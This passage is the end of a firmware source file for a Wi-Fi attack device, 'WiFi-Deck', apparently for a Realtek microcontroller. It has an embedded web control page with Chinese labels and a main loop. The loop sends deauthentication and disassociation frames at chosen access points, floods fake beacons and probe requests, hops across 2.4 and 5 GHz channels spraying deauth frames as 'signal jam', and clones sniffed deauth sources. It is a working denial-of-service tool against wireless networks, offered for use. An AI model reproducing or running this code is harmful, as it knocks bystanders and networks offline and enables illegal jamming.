function setCfgField(id,val){if(!dirtyFields.has(id))document.getElementById(id).value=val;}
function applyHeaderIdentity(ssid,ble){
  let title=ssid||ble||'WiFi-Deck';
  document.getElementById('hdrName').textContent=title;
  document.title=title+' · 控制台';
}
async function saveConfig(){
  let bleName=document.getElementById('cfgBleName').value.trim();
  let ssid=document.getElementById('cfgApSsid').value.trim();
  let pass=document.getElementById('cfgApPass').value.trim();
  let cycleDelay=Number(document.getElementById('cfgCycleDelay').value);
  let scanTime=Number(document.getElementById('cfgScanTime').value);
  let numFrames=Number(document.getElementById('cfgNumFrames').value);
  let startCh=Number(document.getElementById('cfgStartChannel').value);
  let sendBle=dirtyFields.has('cfgBleName')||bleName!==loadedBleName;
  let sendSsid=dirtyFields.has('cfgApSsid')||ssid!==loadedApSsid;
  let sendPass=pass.length>0;
  let bleLen=utf8ByteLen(bleName),ssidLen=utf8ByteLen(ssid),passLen=utf8ByteLen(pass);
  if(sendBle&&(bleLen<1||bleLen>26)){toast('BLE 名称需为 1~26 字节');return;}
  if(sendSsid&&(ssidLen<1||ssidLen>32)){toast('WiFi 热点名称需为 1~32 字节');return;}
  if(sendPass&&(passLen<8||passLen>63)){toast('WiFi 密码需为 8~63 字符/字节');return;}
  if(!Number.isInteger(cycleDelay)||cycleDelay<100||cycleDelay>60000){toast('攻击间隔需在 100~60000 ms');return;}
  if(!Number.isInteger(scanTime)||scanTime<500||scanTime>30000){toast('扫描时间需在 500~30000 ms');return;}
  if(!Number.isInteger(numFrames)||numFrames<1||numFrames>100){toast('单次突发帧数需在 1~100');return;}
  if(!Number.isInteger(startCh)||!(startCh===1||(startCh>=36&&startCh<=165))){toast('起始信道需为 1 或 36~165');return;}
  let credsChanged=(sendSsid&&ssid!==loadedApSsid)||sendPass;
  let parts=[];
  if(sendBle)parts.push('ble_name='+encodeURIComponent(bleName));
  if(sendSsid)parts.push('ap_ssid='+encodeURIComponent(ssid));
  if(sendPass)parts.push('ap_pass='+encodeURIComponent(pass));
  parts.push('cycle_delay='+cycleDelay,'scan_time='+scanTime,'num_frames='+numFrames,'start_channel='+startCh,'scan_cycles='+document.getElementById('cfgScanCycles').value,'led='+document.getElementById('cfgLed').value);
  let body=parts.join('&');
  let res=await fetchAPI(API+'/config',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body},4000);
  let data=res.data;
  if(res.ok&&data&&data.status==='ok'){
    dirtyFields.clear();
    if(sendBle){loadedBleName=bleName;syncedBle=bleName;}
    if(sendSsid){loadedApSsid=ssid;syncedSsid=ssid;}
    if(sendPass)document.getElementById('cfgApPass').value='';
    applyHeaderIdentity(loadedApSsid,loadedBleName);
    toast((data.ap_restarted||credsChanged)?'配置已保存，热点正按新名称/密码重启，请重新连接 WiFi':'配置已保存至 Flash');
  }else if(data&&data.message){
    toast('保存失败: '+data.message);
  }else if(credsChanged){
    dirtyFields.clear();
    if(sendSsid){loadedApSsid=ssid;syncedSsid=ssid;}
    if(sendPass)document.getElementById('cfgApPass').value='';
    applyHeaderIdentity(loadedApSsid,loadedBleName);
    toast('热点凭据已更新并重启，请重新连接新 WiFi');
  }else{
    toast('配置保存请求失败，请检查热点连接');
  }
}
async function resetDefaultConfig(){
  dirtyFields.clear();
  document.getElementById('cfgApPass').value='';
  await sendCmd('reset_config');
  [500,1500,3500].forEach(ms=>setTimeout(()=>initStatus(true),ms));
}
async function initStatus(force=false){
  let data=await fetchJSON(API+'/info',{},3500);
  if(data){
    if(force){dirtyFields.clear();document.getElementById('cfgApPass').value='';}
    if(data.ble_name){loadedBleName=data.ble_name;syncedBle=data.ble_name;setCfgField('cfgBleName',data.ble_name);}
    if(data.ssid){loadedApSsid=data.ssid;syncedSsid=data.ssid;setCfgField('cfgApSsid',data.ssid);}
    applyHeaderIdentity(data.ssid,data.ble_name);
    setCfgField('cfgCycleDelay',data.cycle_delay);
    setCfgField('cfgScanTime',data.scan_time);
    setCfgField('cfgNumFrames',data.num_frames);
    setCfgField('cfgStartChannel',data.start_channel);
    setCfgField('cfgScanCycles',data.scan_between_cycles?'on':'off');
    setCfgField('cfgLed',data.led?'on':'off');
  }
}
window.onload=()=>{
  document.querySelectorAll('#page-config input, #page-config select').forEach(el=>
    el.addEventListener(el.tagName==='SELECT'?'change':'input',()=>dirtyFields.add(el.id))
  );
  renderNetworks();initStatus(true);updateAttackStats();
  setInterval(()=>{
    if(reconnectingAP)return;
    updateAttackStats();
    if(document.getElementById('page-sniff').classList.contains('active'))fetchLogs();
  },2500);
};
</script>
</body>
</html>)=====";

//==========================================================
// Setup
//==========================================================
void setup() {
  Serial.begin(115200);
  scanMutex = xSemaphoreCreateMutex();
  if (scanMutex == NULL) {
    Serial.println("[ERROR] Failed to create scanMutex!");
  }

  loadConfigFromFlash();

  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);
  if (USE_LED) {
    digitalWrite(LED_R, HIGH); delay(100); digitalWrite(LED_R, LOW);
    digitalWrite(LED_G, HIGH); delay(100); digitalWrite(LED_G, LOW);
    digitalWrite(LED_B, HIGH); delay(100); digitalWrite(LED_B, LOW);
  }

  Serial.println("=== WiFi-Deck ===");
  Serial.println("[INFO] Starting WiFi AP (non-hidden)...");

  // Start AP in non-hidden mode so phones can discover it
  startSoftAP();

  Serial.println("[INFO] AP started: " + String(ap_ssid));
  Serial.println("[INFO] Connect to this WiFi and open 192.168.1.1");
  Serial.println("[INFO] Web server started on port 80");

  // Start BLE UART service for the Android App
  setupBLE();

  last_cycle = millis();
}

//==========================================================
// Main Loop
//==========================================================
void loop() {
  // BLE 异常掉线复位：连接断开后若未收到 CCCD 取消订阅回调，bleNotifyEnabled 会残留为 true，
  // 导致对不存在的连接反复 notify
  if (bleNotifyEnabled && !BLE.connected(activeConnId)) {
    bleNotifyEnabled = false;
  }

  // 优先响应来自任意通道的急停标志，避免旧排队指令阻塞停机
  consumePriorityStopIfPending();

  bool warnOverflow = false;
  bool warnOversize = false;
  rtw_enter_critical(NULL, NULL);
  if (bleCmdQueueOverflow) {
    bleCmdQueueOverflow = false;
    warnOverflow = true;
  }
  if (bleCmdOversizeDrop) {
    bleCmdOversizeDrop = false;
    warnOversize = true;
  }
  rtw_exit_critical(NULL, NULL);
  if (warnOverflow) {
    Serial.println("[WARN] BLE command ring full; dropped oldest overflow command.");
    bleSendLog("[WARN] BLE 指令队列已满，部分指令被丢弃");
  }
  if (warnOversize) {
    Serial.println("[ERROR] BLE command exceeds max payload length (219B); rejected.");
    bleSendLog("[ERROR] BLE 单条指令超过 219B 上限，已拒绝");
  }

  // Handle commands from Serial via non-blocking line buffer
  pollSerialInput();
  while (serialCmdTail != serialCmdHead) {
    if (consumePriorityStopIfPending()) break;
    char sCmdBuf[BLE_BUF_SIZE];
    strncpy(sCmdBuf, serialCmdQueue[serialCmdTail], sizeof(sCmdBuf) - 1);
    sCmdBuf[sizeof(sCmdBuf) - 1] = '\0';
    serialCmdTail = (serialCmdTail + 1) % SERIAL_CMD_QUEUE_SIZE;
    handleCommand(String(sCmdBuf));
    pollSerialInput();
  }

  // Handle commands queued from the BLE task (critical section protected)
  while (true) {
    if (consumePriorityStopIfPending()) break;
    char cmdBuf[BLE_BUF_SIZE];
    bool hasCmd = false;
    rtw_enter_critical(NULL, NULL);
    if (cmdTail != cmdHead) {
      strncpy(cmdBuf, cmdRing[cmdTail], sizeof(cmdBuf) - 1);
      cmdBuf[sizeof(cmdBuf) - 1] = '\0';
      cmdTail = (cmdTail + 1) % CMD_RING_SIZE;
      hasCmd = true;
    }
    rtw_exit_critical(NULL, NULL);
    if (!hasCmd) break;
    handleCommand(String(cmdBuf));
  }

  // 兜底：若双队列排空后 emergencyStopRequested 仍置位且队列中无待消费的停机指令，立即执行一次安全停机复位活跃状态
  if (emergencyStopRequested) {
    bool stopQueued = false;
    uint8_t sIdx = serialCmdTail;
    while (sIdx != serialCmdHead) {
      if (isStopCmdCstr(serialCmdQueue[sIdx])) {
        stopQueued = true;
        break;
      }
      sIdx = (sIdx + 1) % SERIAL_CMD_QUEUE_SIZE;
    }
    if (!stopQueued && hasQueuedStopInCmdRing()) {
      stopQueued = true;
    }
    if (!stopQueued) {
      handleCommand("stop");
    }
  }

  // Handle web clients (throttled to 25ms to reduce lwIP non-blocking accept overhead)
  static unsigned long lastWebPoll = 0;
  if (millis() - lastWebPoll >= 25) {
    lastWebPoll = millis();
    handleWebClient();
  }

  // Deferred SoftAP restart after SSID/Password change (allows BLE notify / HTTP 200 to flush first)
  if (pendingApRestart && (millis() - pendingApRestartAt >= 300)) {
    pendingApRestart = false;
    bool sniffActive = false;
    rtw_enter_critical(NULL, NULL);
    sniffActive = (isSniffing || deauth_sniff_enabled);
    rtw_exit_critical(NULL, NULL);
    if (apEnabled && !sniffActive) {
      stopAllActiveAttacks();
      startSoftAP();
      blePushStatus();
      Serial.println("[INFO] SoftAP restarted with new credentials: " + String(ap_ssid));
    }
  }

  // Timed Attack check
  checkTimedAttack();

  // Attack cycles
  if (millis() - last_cycle > cycle_delay) {
    if (attack_enabled && !emergencyStopRequested) {
      if (scan_between_cycles) {
        Serial.println("[INFO] Starting scan between attack cycles...");
        if (scanNetworks(true, true) == 0) {
          printScanResults();
        }
      }
      if (!shouldAbortCycle() && attack_enabled) {
        if (hasSelectedTargetsSafe()) {
          targetAttack();
        } else {
          // 决策 A：无已选目标时停止攻击而非回退全量攻击
          attack_enabled = false;
          timedAttackEnabled = false;
          blePushStatus();
          Serial.println("[WARN] Deauth attack stopped: no selected targets.");
        }
      }
      checkTimedAttack();
    }
    last_cycle = millis();
  }

  //===============================
  // CONTINUOUS DISASSOC ATTACK
  //===============================
  if (disassoc_enabled && !emergencyStopRequested && (millis() - last_disassoc_attack >= disassoc_interval)) {
    last_disassoc_attack = millis();

    std::vector<WiFiScanResult> aps_to_attack = snapshotDisassocTargets();

    if (aps_to_attack.empty()) {
      // 决策 A：无选定目标时停止 Disassoc，绝不回退全攻
      disassoc_enabled = false;
      restoreDefaultChannelIfNeeded(false);
      if (USE_LED) digitalWrite(LED_B, LOW);
      blePushStatus();
      Serial.println("[WARN] Disassoc stopped: no selected targets.");
    } else {
      if (USE_LED) digitalWrite(LED_B, HIGH);
      bool aborted = false;
      for (size_t i = 0; i < aps_to_attack.size(); i++) {
        if (shouldAbortCycle() || !disassoc_enabled) {
          aborted = true;
          break;
        }
        if (wifi_set_channel(aps_to_attack[i].channel) != RTW_SUCCESS) {
          Serial.print("[WARN] wifi_set_channel(");
          Serial.print(aps_to_attack[i].channel);
          Serial.println(") failed");
          continue;
        }
        setCurrentChannelSafe((int)aps_to_attack[i].channel);
        for (unsigned long j = 0; j < num_send_frames; j++) {
          if (shouldAbortCycle() || !disassoc_enabled) {
            aborted = true;
            break;
          }
          uint16_t reason = disassoc_reasons[j % num_disassoc_reasons];
          // 仅发 AP -> Broadcast 的有效帧
          wifi_tx_disassoc_frame(aps_to_attack[i].bssid, dst_mac, reason);
          delay(1);
        }
        if (aborted) break;
      }
      restoreDefaultChannelIfNeeded(false);
      if (USE_LED) digitalWrite(LED_B, LOW);
      Serial.println("[DISASSOC] Attack cycle completed.");
    }
  }

  //===============================
  // BEACON FLOOD
  //===============================
  if (beacon_flood_enabled && !emergencyStopRequested && (millis() - last_beacon_flood >= beacon_flood_delay)) {
    last_beacon_flood = millis();
    char fakeSSID[BEACON_MAX_SSID_LEN + 1];
    int ssidLen = random(8, 17);
    for (int i = 0; i < ssidLen; i++) {
      fakeSSID[i] = random(33, 127);
    }
    fakeSSID[ssidLen] = 0;
    wifi_tx_beacon_frame(fakeSSID, ssidLen, (uint8_t)getCurrentChannelSafe());
    beacon_flood_count++;
    if (beacon_flood_count % 20 == 0) {
      Serial.print("[BCN FLOOD] ");
      Serial.print(beacon_flood_count);
      Serial.println(" beacons sent");
    }
  }

  //===============================
  // PROBE FLOOD
  //===============================
  if (probe_flood_enabled && !emergencyStopRequested && (millis() - last_probe_flood >= probe_flood_delay)) {
    last_probe_flood = millis();
    char fakeSSID[BEACON_MAX_SSID_LEN + 1];
    int ssidLen = random(4, 13);
    for (int i = 0; i < ssidLen; i++) {
      fakeSSID[i] = random(33, 127);
    }
    fakeSSID[ssidLen] = 0;
    wifi_tx_probe_req_frame(fakeSSID, ssidLen);
    probe_flood_count++;
    if (probe_flood_count % 50 == 0) {
      Serial.print("[PRB FLOOD] ");
      Serial.print(probe_flood_count);
      Serial.println(" probes sent");
    }
  }

  //===============================
  // SIGNAL JAM (rapid channel cycling + deauth)
  //===============================
  if (signal_jam_enabled && !emergencyStopRequested && (millis() - last_signal_jam >= signal_jam_hop_delay)) {
    last_signal_jam = millis();
    // 合并轮询 2.4G + 5G 全信道，仅在切频成功时更新 currentChannel，并在 SoftAP 开启时及时回切 CH 1
    static const int num2G = sizeof(CHANNELS_2GHZ) / sizeof(CHANNELS_2GHZ[0]);
    static const int num5G = sizeof(CHANNELS_5GHZ) / sizeof(CHANNELS_5GHZ[0]);
    int totalChs = num2G + num5G;
    if (signal_jam_ch_index < 0 || signal_jam_ch_index >= totalChs) {
      signal_jam_ch_index = 0;
    }
    int targetCh = (signal_jam_ch_index < num2G)
      ? CHANNELS_2GHZ[signal_jam_ch_index]
      : CHANNELS_5GHZ[signal_jam_ch_index - num2G];
    signal_jam_ch_index = (signal_jam_ch_index + 1) % totalChs;

    if (wifi_set_channel(targetCh) == RTW_SUCCESS) {
      setCurrentChannelSafe(targetCh);
      for (int j = 0; j < 3; j++) {
        if (shouldAbortCycle()) break;
        uint8_t fakeBSSID[6];
        randomMAC(fakeBSSID);
        wifi_tx_deauth_frame(fakeBSSID, dst_mac, deauth_reasons[j % num_deauth_reasons]);
      }
      signal_jam_count++;
      if (apEnabled || softApActive) {
        if (wifi_set_channel(WIFI_CHANNEL) == RTW_SUCCESS) {
          setCurrentChannelSafe(WIFI_CHANNEL);
        }
      }
    } else {
      Serial.print("[WARN] signal_jam wifi_set_channel(");
      Serial.print(targetCh);
      Serial.println(") failed");
    }
    if (USE_LED) { digitalWrite(LED_B, !digitalRead(LED_B)); }
    if (signal_jam_count > 0 && signal_jam_count % 50 == 0) {
      Serial.print("[SIG JAM] ");
      Serial.print(signal_jam_count);
      Serial.print(" cycles, ch=");
      Serial.println(targetCh);
    }
  }

  //===============================
  // DEAUTH SNIFF-AND-CLONE
  //===============================
  bool runDeauthCloneTx = false;
  uint8_t clonedSrc[6];
  int targetCh = WIFI_CHANNEL;
  int prevCh = WIFI_CHANNEL;
  if (millis() - last_deauth_sniff_attack >= deauth_sniff_interval) {
    rtw_enter_critical(NULL, NULL);
    if (deauth_sniff_enabled && !emergencyStopRequested && has_sniffed_deauth) {
      memcpy(clonedSrc, sniffed_deauth_src, 6);
      targetCh = sniffed_deauth_ch;
      prevCh = currentChannel;
      has_sniffed_deauth = false;
      runDeauthCloneTx = true;
    }
    rtw_exit_critical(NULL, NULL);
  }
  if (runDeauthCloneTx) {
    last_deauth_sniff_attack = millis();

    // Pause promisc callback briefly to TX cloned frame cleanly, without toggling UI isSniffing state
    wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0);
    bool switched = false;
    bool chReady = (targetCh == prevCh);
    if (!chReady && wifi_set_channel(targetCh) == RTW_SUCCESS) {
      setCurrentChannelSafe(targetCh);
      switched = true;
      chReady = true;
    }
    if (chReady) {
      for (unsigned long j = 0; j < num_send_frames; j++) {
        if (shouldAbortCycle()) break;
        wifi_tx_deauth_frame(clonedSrc, dst_mac, deauth_reasons[j % num_deauth_reasons]);
        delay(1);
      }
    }
    if (switched && wifi_set_channel(prevCh) == RTW_SUCCESS) {
      setCurrentChannelSafe(prevCh);
    }
    bool keepPromisc = false;
    rtw_enter_critical(NULL, NULL);
    keepPromisc = (deauth_sniff_enabled && isSniffing && !emergencyStopRequested);
    rtw_exit_critical(NULL, NULL);
    if (keepPromisc) {
      wifi_set_promisc(RTW_PROMISC_ENABLE_2, promisc_callback, 1);
    }
  }

  // Handle channel hopping if enabled
  bool sniffingLoop = false;
  rtw_enter_critical(NULL, NULL);
  sniffingLoop = (isSniffing && !emergencyStopRequested);
  rtw_exit_critical(NULL, NULL);
  if (sniffingLoop) {
    hopChannel();
  }

  // Drain sniff logs safely in main loop (print to UART & push to BLE at ~15ms intervals)
  static unsigned long lastLogPush = 0;
  static unsigned long lastDropWarnMs = 0;
  if (millis() - lastLogPush >= 15) {
    char logItem[LOG_STR_LEN];
    bool hasLog = false;
    uint32_t dropped = 0;
    rtw_enter_critical(NULL, NULL);
    if (logTail != logHead) {
      strncpy(logItem, sniffLogRing[logTail], sizeof(logItem) - 1);
      logItem[sizeof(logItem) - 1] = '\0';
      logTail = (logTail + 1) % LOG_RING_SIZE;
      hasLog = true;
    }
    if (droppedLogCount > 0 && (millis() - lastDropWarnMs >= 2000)) {
      dropped = droppedLogCount;
      droppedLogCount = 0;
      lastDropWarnMs = millis();
    }
    rtw_exit_critical(NULL, NULL);
    if (hasLog) {
      lastLogPush = millis();
      Serial.println(logItem);
      bleSendLog(String(logItem));
    }
    if (dropped > 0) {
      String warnMsg = "[WARN] Sniff log ring dropped " + String(dropped) + " overflow frames";
      Serial.println(warnMsg);
      bleSendLog(warnMsg);
    }
  }

  // Push status heartbeat every 1s
  static unsigned long lastStatusPush = 0;
  if (millis() - lastStatusPush >= 1000) {
    lastStatusPush = millis();
    blePushStatus();
  }
}
